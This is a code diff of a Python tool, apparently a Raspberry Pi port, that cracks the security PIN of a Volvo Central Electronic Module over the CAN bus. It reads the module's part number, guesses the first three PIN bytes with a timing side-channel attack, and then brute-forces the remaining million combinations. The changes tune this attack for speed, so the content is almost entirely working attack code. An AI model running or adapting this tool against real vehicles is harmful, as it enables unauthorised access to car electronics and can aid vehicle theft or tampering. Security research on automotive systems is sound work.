@@ -27,10 +27,8 @@ SHUFFLE_ORDERS = [
 ]
 
 # Known CEM Configurations (P/N -> (Baud, ShuffleIndex))
-# 0 = 500k, 1 = 250k, 2 = 125k (We only care about baud rate value)
 BAUD_500K = 500000
 BAUD_250K = 250000
-# Note: P1 High Speed is 500k. P2 uses varying speeds.
 
 CEM_PARAMS = {
     # P1
@@ -56,11 +54,14 @@ CEM_PARAMS = {
     30786476: (BAUD_500K, 1), 30728539: (BAUD_500K, 1), 30728357: (BAUD_500K, 1),
     30765148: (BAUD_500K, 1), 30765643: (BAUD_500K, 1), 30795115: (BAUD_500K, 1),
     31282455: (BAUD_500K, 1), 31394157: (BAUD_500K, 1), 30786579: (BAUD_500K, 1),
-    30786890: (BAUD_500K, 1) # Added from duplicate in original source
+    30786890: (BAUD_500K, 1) 
 }
 
 LOG_FILE = "crack.log"
 SESSION_FILE = "session.json"
+
+# Pre-calculate BCD table for 0-99
+BCD_TABLE = [((val // 10) << 4) | (val % 10) for val in range(100)]
 
 def log(msg):
     print(msg)
@@ -74,6 +75,9 @@ def bcd_to_bin(val):
     return ((val >> 4) * 10) + (val & 0x0F)
 
 def bin_to_bcd(val):
+    # Use lookup if in range, else calc
+    if 0 <= val < 100:
+        return BCD_TABLE[val]
     return ((val // 10) << 4) | (val % 10)
 
 
@@ -84,111 +88,67 @@ class VolvoCracker:
         self.cem_pn = 0
         self.baud = 500000
         self.shuffle = SHUFFLE_ORDERS[0]
-        self.cem_id = CEM_HS_ID # Default to High Speed
-
-    def save_session(self, index, fixed_bytes):
-        """Saves current brute force index and config to disk."""
-        try:
-            state = {
-                "timestamp": time.time(),
-                "index": index,
-                "fixed_bytes": fixed_bytes
-            }
-            # Write to temp file then atomic move to prevent corruption
-            tmp_file = SESSION_FILE + ".tmp"
-            with open(tmp_file, "w") as f:
-                json.dump(state, f)
-            os.replace(tmp_file, SESSION_FILE)
-        except Exception as e:
-            log(f"Warning: Failed to save session: {e}")
-
-    def load_session(self):
-        """
-        Loads saved session. 
-        Returns (index, fixed_bytes) or (None, None).
-        Rewinds index by safe margin.
-        """
-        if not os.path.exists(SESSION_FILE):
-            return None, None
+        self.cem_id = CEM_HS_ID 
         
-        try:
-            with open(SESSION_FILE, "r") as f:
-                state = json.load(f)
-            
-            idx = state.get("index", 0)
-            fixed = state.get("fixed_bytes", [0]*6)
-            
-            # REWIND SAFETY MARGIN
-            # Rewind 500 attempts to cover power loss buffering
-            safe_idx = max(0, idx - 500)
-            
-            log(f"Session found! Resuming from index {safe_idx} (was {idx}).")
-            return safe_idx, fixed
-        except Exception as e:
-            log(f"Error loading session: {e}")
-            return None, None
+        # Optimization: Pre-allocate reusable message
+        self.tx_msg = can.Message(
+            arbitration_id=REQ_ID, 
+            data=[0]*8,
+            is_extended_id=True,
+            check=False # Disable some safety checks for speed
+        )
 
     def setup_can(self, bitrate):
         if self.bus:
             self.bus.shutdown()
         
-        log(f"Initializing CAN on {self.channel} @ {bitrate}...")
+        print(f"Initializing CAN on {self.channel} @ {bitrate}...")
         try:
-            # Note: On Pi with socketcan, the bitrate is usually set via 'ip link' 
-            # before the script runs. But we can try to set it if we have permissions 
-            # or just assume it is set.
-            # For this script, we'll assume the OS interface is up, or we just bind to it.
-            # If we need to change bitrate, we might need shell commands.
+            # Add filters to ignore noise
+            filters = [
+                {"can_id": 0x00000003, "can_mask": 0x1FFFFFFF, "extended": True}, # HS Reply
+                {"can_id": 0x00000005, "can_mask": 0x1FFFFFFF, "extended": True}, # LS Reply
+                {"can_id": 0x03, "can_mask": 0x7FF, "extended": False},           # Std ID Reply?
+            ]
             
-            # Simple check if interface is up with correct bitrate? 
-            # For now, just bind.
-            self.bus = can.interface.Bus(channel=self.channel, bustype='socketcan')
+            self.bus = can.interface.Bus(
+                channel=self.channel, 
+                bustype='socketcan',
+                bitrate=bitrate,
+                can_filters=filters
+            )
             self.baud = bitrate
             return True
         except Exception as e:
-            log(f"Error initializing CAN: {e}")
+            print(f"Error initializing CAN: {e}")
             return False
 
     def send_msg(self, arbitration_id, data, is_extended=False):
+        # Helper for non-critical messages
         msg = can.Message(arbitration_id=arbitration_id, data=data, is_extended_id=is_extended)
         try:
             self.bus.send(msg)
-            return time.time() # Return software timestamp of send
+            return time.time()
         except can.CanError as e:
-            log(f"Send Error: {e}")
+            print(f"Send Error: {e}")
             return None
 
     def read_part_number(self):
-        """
-        Attempts to read CEM Part Number.
-        Returns P/N (int) or None.
-        """
-        # Request: [0xCB, CEM_ID, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
-        # Using extended ID 0x000FFFFE
-        
-        # Try HS ID first, then LS ID?
-        # The .ino tries both. We will focus on HS first.
+        """Attempts to read CEM Part Number."""
+        # Need to temporarily disable filters or add broadcast filter?
+        # For simplicity, we just rely on the existing filters catching the reply (usually 0x00000003)
         
         target_ids = [CEM_HS_ID, CEM_LS_ID]
         
         for tid in target_ids:
-            log(f"Attempting to read P/N from Node {hex(tid)}...")
-            
+            print(f"Attempting to read P/N from Node {hex(tid)}...")
             req = [0xCB, tid, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
             
-            # Try a few times
             for _ in range(3):
-                # Clear buffer
+                # Drain
                 while self.bus.recv(timeout=0): pass
                 
                 self.send_msg(REQ_ID, req, is_extended=True)
-                
-                # Wait for response
-                # Response usually on ID 0x00000003 (HS) or 0x00000005 (LS)
-                # Format: Multi-frame ISO-TP usually? 
-                # The .ino implementation handles a simplified multi-frame reassembly.
-                # Frame 0: [0x8?, ..., D1, D2, D3] (High nibble 8 means first frame?)
-                # Frame 1: [0x4?, D4, ...]
                 
                 start = time.time()
                 frames = {}
@@ -197,30 +157,15 @@ class VolvoCracker:
                     msg = self.bus.recv(timeout=0.1)
                     if not msg: continue
                     
-                    # Check for response ID
-                    # P1/P2 usually reply on specific low IDs
-                    rid = msg.arbitration_id
-                    if rid not in [0x03, 0x05, 0x00000003, 0x00000005]:
-                        # Some might reply with extended ID logic, but let's stick to .ino
-                        pass
-                    
-                    # Logic from .ino:
-                    # if frame == 0 && rcv[0] & 0x80: pn parts...
-                    # if frame == 1 && !(rcv[0] & 0x40): pn parts...
-                    
                     d = msg.data
                     if not d: continue
 
-                    if d[0] & 0x80: # First frame (PCI type 1? or 0x80 marker in their proprietary proto)
-                        # .ino: pn = d[5]*10000 + d[6]*100 + d[7] (BCD to Bin)
-                        # Actually: pn *= 100; pn += bcdToBin(rcv[5]); ...
+                    if d[0] & 0x80: 
                         frames[0] = d
-                    elif (d[0] & 0x40) == 0: # Consecutive frame? 
-                        # .ino logic: frame == 1 && !(rcv[0] & 0x40)
+                    elif (d[0] & 0x40) == 0: 
                         frames[1] = d
                         
                     if 0 in frames and 1 in frames:
-                        # Reassemble
                         f0 = frames[0]
                         f1 = frames[1]
                         
@@ -230,9 +175,8 @@ class VolvoCracker:
                         pn = (pn * 100) + bcd_to_bin(f0[7])
                         pn = (pn * 100) + bcd_to_bin(f1[1])
                         
-                        log(f"Found Part Number: {pn}")
+                        print(f"Found Part Number: {pn}")
                         return pn
-        
         return None
 
     def configure_for_cem(self, pn):
@@ -240,253 +184,231 @@ class VolvoCracker:
             baud, shuff_idx = CEM_PARAMS[pn]
             self.baud = baud
             self.shuffle = SHUFFLE_ORDERS[shuff_idx]
-            log(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
+            print(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
             return True
         else:
-            log(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
+            print(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
             self.baud = 500000
             self.shuffle = SHUFFLE_ORDERS[0]
             return False
 
-    def unlock_attempt(self, pin_bytes, measure_latency=False):
+    def unlock_attempt_fast(self, pin_bytes):
         """
-        Sends PIN, checks for success.
-        If measure_latency is True, returns (success, latency_seconds).
-        Else returns (success, 0).
+        Optimized unlock attempt for Brute Force.
+        Returns: True if success, False otherwise.
         """
-        # Prepare data [CEM_ID, 0xBE, P_shuffled...]
-        data = [self.cem_id, CMD_UNLOCK] + [0]*6
+        # Update reusable message data in place
+        d = self.tx_msg.data
+        d[0] = self.cem_id
+        d[1] = CMD_UNLOCK
         
         # Apply shuffle
-        # pin_bytes is [b0, b1, b2, b3, b4, b5]
-        # shuffle order is e.g. [0, 1, 2, 3, 4, 5] map
-        # data[2 + shuffle_order[i]] = pin_bytes[i]
+        # Unroll loop for speed? 6 iters is small but Python overhead is high.
+        # shuffle is a list, e.g. [0, 1, 2, 3, 4, 5]
+        s = self.shuffle
+        d[2 + s[0]] = pin_bytes[0]
+        d[2 + s[1]] = pin_bytes[1]
+        d[2 + s[2]] = pin_bytes[2]
+        d[2 + s[3]] = pin_bytes[3]
+        d[2 + s[4]] = pin_bytes[4]
+        d[2 + s[5]] = pin_bytes[5]
         
-        for i in range(6):
-            data[2 + self.shuffle[i]] = pin_bytes[i]
-            
-        # Send
-        # self.bus.send ...
-        msg = can.Message(arbitration_id=REQ_ID, data=data, is_extended_id=True)
-        
-        # We need precise timing here for the attack
-        # Drain buffer first to avoid reading old messages
-        while self.bus.recv(timeout=0): pass
+        # Drain buffer? No, relying on filters to keep it clean.
+        # If we drain every time, we waste time. 
+        # But if we don't drain, we might read an old message.
+        # Since we are request-response, the buffer should be empty unless we timed out previously.
+        # Compromise: Drain only if we suspect debris? 
+        # For max speed, we assume sync.
         
         try:
-            # We want the timestamp of when it was SENT (approx)
-            self.bus.send(msg)
-            t_send = time.time() 
+            self.bus.send(self.tx_msg)
+        except can.CanError:
+            return False
+
+        # Wait for reply
+        # Reduced timeout to 10ms (0.01)
+        msg = self.bus.recv(timeout=0.01)
+        
+        if msg:
+            # Filters ensure we only get relevant IDs. Check content.
+            # Reply: [CEM_ID, 0xB9, 0x00...]
+            if len(msg.data) > 2 and msg.data[1] == CMD_UNLOCK_REPLY and msg.data[2] == 0x00:
+                return True
+                
+        return False
+
+    def unlock_attempt_timing(self, pin_bytes):
+        """
+        Unlock attempt with timing measurement.
+        Returns: (success, latency)
+        """
+        # Re-use logic but with timestamps
+        d = self.tx_msg.data
+        d[0] = self.cem_id
+        d[1] = CMD_UNLOCK
+        s = self.shuffle
+        for i in range(6): d[2 + s[i]] = pin_bytes[i]
+        
+        while self.bus.recv(timeout=0): pass # Drain for precision
+        
+        try:
+            self.bus.send(self.tx_msg)
+            t_send = time.time()
         except can.CanError:
             return False, 0
 
-        # Wait for reply
-        # Reply format: [CEM_ID, 0xB9, 0x00...] (Success) or other (Fail)
-        # Timeout needs to be short but enough for CEM processing
-        
-        t_recv = 0
-        success = False
-        
-        # Wait up to 0.1s
-        start_wait = time.time()
-        while time.time() - start_wait < 0.1:
+        # Wait longer for timing attack to ensure we catch it? 
+        # The latency is the key.
+        start = time.time()
+        while time.time() - start < 0.1:
             rx = self.bus.recv(timeout=0.02)
-            if not rx: continue
-            
-            # Check if it's from CEM
-            if len(rx.data) > 2 and rx.data[0] == self.cem_id:
-                t_recv = rx.timestamp # Use kernel/driver timestamp if available
-                if t_recv == 0.0: t_recv = time.time() # Fallback
-                
-                # Check Success
+            if rx and len(rx.data) > 2 and rx.data[0] == self.cem_id:
+                t_recv = rx.timestamp or time.time()
                 if rx.data[1] == CMD_UNLOCK_REPLY and rx.data[2] == 0x00:
-                    success = True
-                
-                # We got a relevant reply, stop waiting
-                break
+                    return True, t_recv - t_send
+                return False, t_recv - t_send # Return latency even on failure
         
-        if t_recv == 0: 
-            return False, 0 # No reply
-            
-        latency = t_recv - t_send
-        return success, latency
+        return False, 0
 
     def crack_timing(self, known_bytes=0):
-        """
-        Attempt to find the first few bytes using timing analysis.
-        This is experimental on Pi.
-        """
-        log(f"Starting Timing Attack for first 3 bytes...")
+        """Attempt to find the first few bytes using timing analysis."""
+        print(f"Starting Timing Attack for first 3 bytes...")
+        current_pin = [0]*6
         
-        current_pin = [0, 0, 0, 0, 0, 0]
-        
-        # We try to find bytes 0, 1, 2
         for pos in range(known_bytes, 3):
-            log(f"Analyzing PIN byte {pos}...")
-            
-            # Histogram: [latency_sum, count] for each candidate byte value (0x00-0x99 BCD)
+            print(f"Analyzing PIN byte {pos}...")
             stats = {}
+            SAMPLES = 20
             
-            # Candidates: 0-99 (BCD)
-            # To save time, we might only test a subset or do it in passes. 
-            # The .ino does 10-300 samples per candidate.
-            
-            candidates = [bin_to_bcd(x) for x in range(100)]
-            
-            best_byte = 0
-            best_lat = 0
-            
-            # We will use a smaller sample size than .ino because Python is slow
-            SAMPLES = 20 
-            
-            log(f"Collecting {SAMPLES} samples per candidate (00-99)...")
-            
-            for b_val in candidates:
+            for b_val_int in range(100):
+                b_val = BCD_TABLE[b_val_int]
                 current_pin[pos] = b_val
-                
                 total_lat = 0
                 valid_samples = 0
                 
                 for _ in range(SAMPLES):
-                    # Randomize next bytes to average out noise
                     if pos + 1 < 6:
-                        current_pin[pos+1] = bin_to_bcd(random.randint(0, 99))
+                        current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
                     
-                    suc, lat = self.unlock_attempt(current_pin, measure_latency=True)
+                    suc, lat = self.unlock_attempt_timing(current_pin)
                     if suc:
-                        log(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
+                        print(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
                         return current_pin
-                    
                     if lat > 0:
                         total_lat += lat
                         valid_samples += 1
                 
                 if valid_samples > 0:
-                    avg_lat = total_lat / valid_samples
-                    stats[b_val] = avg_lat
-                    # print(f"Byte {hex(b_val)}: {avg_lat*1000:.3f}ms", end='\r')
-            
-            # Find candidate with MAX latency (usually correct byte takes longer? 
-            # Actually .ino looks for latency profiles. 
-            # In side channels, correct processing often takes *longer* or *shorter* distinctively.
-            # .ino code sorts by 'latency' descending. So we look for MAX latency.
+                    stats[b_val] = total_lat / valid_samples
             
             sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
-            
             if not sorted_candidates:
-                log("Timing attack failed to get data. Aborting to Brute Force.")
+                print("Timing attack failed. Aborting.")
                 return None
                 
             best_byte = sorted_candidates[0][0]
-            log(f"\nByte {pos} Probable Match: {hex(best_byte)} (Lat: {sorted_candidates[0][1]*1000:.3f}ms)")
-            log(f"Top 3: {[hex(x[0]) for x in sorted_candidates[:3]]}")
-            
+            print(f"Byte {pos} Match: {hex(best_byte)} (Lat: {sorted_candidates[0][1]*1000:.3f}ms)")
             current_pin[pos] = best_byte
-            
-            # Reset next byte to 0 for next pass
             if pos + 1 < 6: current_pin[pos+1] = 0
 
         return current_pin
 
+    def save_session(self, index, fixed_bytes):
+        try:
+            state = {
+                "timestamp": time.time(),
+                "index": index,
+                "fixed_bytes": fixed_bytes
+            }
+            tmp_file = SESSION_FILE + ".tmp"
+            with open(tmp_file, "w") as f:
+                json.dump(state, f)
+            os.replace(tmp_file, SESSION_FILE)
+        except Exception as e:
+            pass
+
+    def load_session(self):
+        if not os.path.exists(SESSION_FILE):
+            return None, None
+        try:
+            with open(SESSION_FILE, "r") as f:
+                state = json.load(f)
+            idx = state.get("index", 0)
+            fixed = state.get("fixed_bytes", [0]*6)
+            return max(0, idx - 500), fixed
+        except:
+            return None, None
+
     def brute_force(self, start_pin, start_index=0):
-        """
-        Brute forces the remaining bytes.
-        start_pin: 6-byte array with fixed bytes filled.
-        start_index: Integer index to start iterating from (0 to 999999).
-        """
-        log(f"Starting Brute Force from index {start_index}...")
+        print(f"Starting Brute Force from index {start_index}...")
         
-        fixed_part_str = f"{bcd_to_bin(start_pin[0]):02d}{bcd_to_bin(start_pin[1]):02d}{bcd_to_bin(start_pin[2]):02d}"
-        log(f"Fixed Prefix: {fixed_part_str} XX XX XX")
+        # Pre-convert fixed bytes to ensure they are ints (if loaded from JSON)
+        # start_pin might be [0x12, 0x34, 0x56, 0, 0, 0]
+        # We assume bytes 0,1,2 are fixed.
         
-        # Range: 0 to 999999 (last 3 bytes)
+        # Use a bytearray or list for mutable PIN to avoid allocation
+        # But we need BCD values.
+        current_pin = list(start_pin)
+        
         total = 1000000
-        
         start_t = time.time()
         
+        # Reduce save frequency
+        SAVE_INTERVAL = 2000 
+        
         for i in range(start_index, total):
-            # Optimized iteration
-            b3 = bin_to_bcd((i // 10000) % 100)
-            b4 = bin_to_bcd((i // 100) % 100)
-            b5 = bin_to_bcd(i % 100)
+            # Optimized math using lookup table
+            # i = 0..999999
+            # b3 = (i / 10000) % 100
+            # b4 = (i / 100) % 100
+            # b5 = i % 100
             
-            current_pin = list(start_pin)
-            current_pin[3] = b3
-            current_pin[4] = b4
-            current_pin[5] = b5
+            # Use divmod for speed?
+            rem = i
+            d1, rem = divmod(rem, 10000)
+            d2, d3 = divmod(rem, 100)
             
-            if i % 100 == 0:
+            current_pin[3] = BCD_TABLE[d1]
+            current_pin[4] = BCD_TABLE[d2]
+            current_pin[5] = BCD_TABLE[d3]
+            
+            if i % SAVE_INTERVAL == 0:
                 elapsed = time.time() - start_t
-                # Calculate real rate based on session start, not total time
                 rate = (i - start_index) / elapsed if elapsed > 0 else 0
                 remaining = total - i
                 eta = remaining / rate if rate > 0 else 0
-                
-                log(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - Trying: {current_pin}")
-                
-                # Save Progress
+                print(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - PIN: {current_pin}")
                 self.save_session(i, start_pin)
             
-            suc, _ = self.unlock_attempt(current_pin)
-            if suc:
-                log(f"\n!!! FOUND PIN: {current_pin} !!!")
-                # Remove session file on success
-                if os.path.exists(SESSION_FILE):
-                    os.remove(SESSION_FILE)
+            if self.unlock_attempt_fast(current_pin):
+                print(f"\n!!! FOUND PIN: {current_pin} !!!")
+                if os.path.exists(SESSION_FILE): os.remove(SESSION_FILE)
                 return current_pin
                 
         return None
 
     def run(self):
-        log("--- Volvo CEM Cracker (Pi Port) ---")
-        
-        # 1. Setup CAN
-        if not self.setup_can(500000): # Default to 500k
-            log("Failed to setup CAN. Check cabling and interfaces.")
+        print("--- Volvo CEM Cracker (Pi Port Optimized) ---")
+        if not self.setup_can(500000):
             return
             
-        # 2. Detect CEM
         pn = self.read_part_number()
-        if pn:
-            self.configure_for_cem(pn)
-        else:
-            log("Could not detect CEM Part Number. Using Defaults.")
+        if pn: self.configure_for_cem(pn)
+        else: print("Using Defaults.")
         
-        # 3. Check for Resume
         resume_index, resume_fixed_bytes = self.load_session()
         
         if resume_index is not None:
-            log("Resuming previous session...")
-            partial_pin = resume_fixed_bytes
+            print("Resuming...")
+            partial_pin = [int(x) for x in resume_fixed_bytes]
             start_idx = resume_index
-            
-            # Re-configure PIN if fixed bytes were saved as integers (JSON lists)
-            # Ensure they are ints
-            partial_pin = [int(x) for x in partial_pin]
-            
-            final_pin = self.brute_force(partial_pin, start_index=start_idx)
-            
+            self.brute_force(partial_pin, start_index=start_idx)
         else:
-            # New Session
-            log("Starting Cracking Sequence.")
-            
-            found_timing = self.crack_timing(known_bytes=0)
-            
-            if found_timing:
-                log(f"Timing Attack result: {found_timing}")
-                partial_pin = found_timing
-            else:
-                log("Timing attack yielded no clear results. Starting from 00 00 00...")
-                partial_pin = [0,0,0,0,0,0]
-            
-            # Start Brute Force from 0
-            final_pin = self.brute_force(partial_pin, start_index=0)
+            print("New Session.")
+            partial_pin = self.crack_timing(known_bytes=0) or [0]*6
+            self.brute_force(partial_pin, start_index=0)
         
-        if final_pin:
-            log("Done.")
-        else:
-            log("Failed to find PIN.")
+        print("Done.")
 
 if __name__ == "__main__":
-    cracker = VolvoCracker()
-    cracker.run()
+    VolvoCracker().run()
